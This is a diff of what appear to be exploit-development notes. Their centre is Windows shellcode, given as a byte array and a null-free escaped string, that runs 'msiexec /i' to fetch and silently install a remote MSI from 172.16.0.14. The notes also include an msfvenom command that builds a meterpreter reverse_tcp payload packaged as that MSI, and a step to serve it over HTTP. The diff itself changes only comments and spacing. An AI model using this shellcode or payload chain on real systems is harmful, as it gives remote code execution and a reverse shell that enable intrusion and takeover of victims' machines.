@@ -2,10 +2,9 @@ https://web.archive.org/web/20120503030935/http://projectshellcode.com/?q=node/1
 
 # Follow above tutorials to output shellcode or follow dudes write-up....I'm sure it works!
 
-
 # The following asm does this: #
 
-# msiexec /i http://172.16.0.14/jasonm.msi /qn
+# msiexec /i http*://172.16.0.14/jasonm.msi /qn
 
 # Need to Determine LoadLibrary, ExitProcess & System via Arwin
 
@@ -103,17 +102,16 @@ unsigned char msi_bin[] = {
   0x00, 0x03, 0x00, 0x04, 0x00, 0x00, 0x00
 };
 
-# get rid of null bytes
-
+#Get rid of null bytes
 
 xvz@xvz-PC ~
 $ ./xxd-shellcode.sh msi.bin
 
 "\xbb\x35\xde\x7f\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\x2e\x6d\x73\x69\x68\x73\x6f\x6e\x6d\x68\x34\x2f\x6a\x61\x68\x2e\x30\x2e\x31\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x37\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x89\xe7\x57\xb8\x77\xb1\x8d\x76\xff\xd0\x31\xc0\x50\xb8\x5a\xbe\x80\x77\xff\xd0"
 
-# add to script
+#add to script
 
-# Create MSI
-# msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=172.16.0.14 -f msi -o jasonm.msi
+#Create MSI
+#msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=172.16.0.14 -f msi -o jasonm.msi
 
-# Start web-server port 80
+#Start web-server port 80
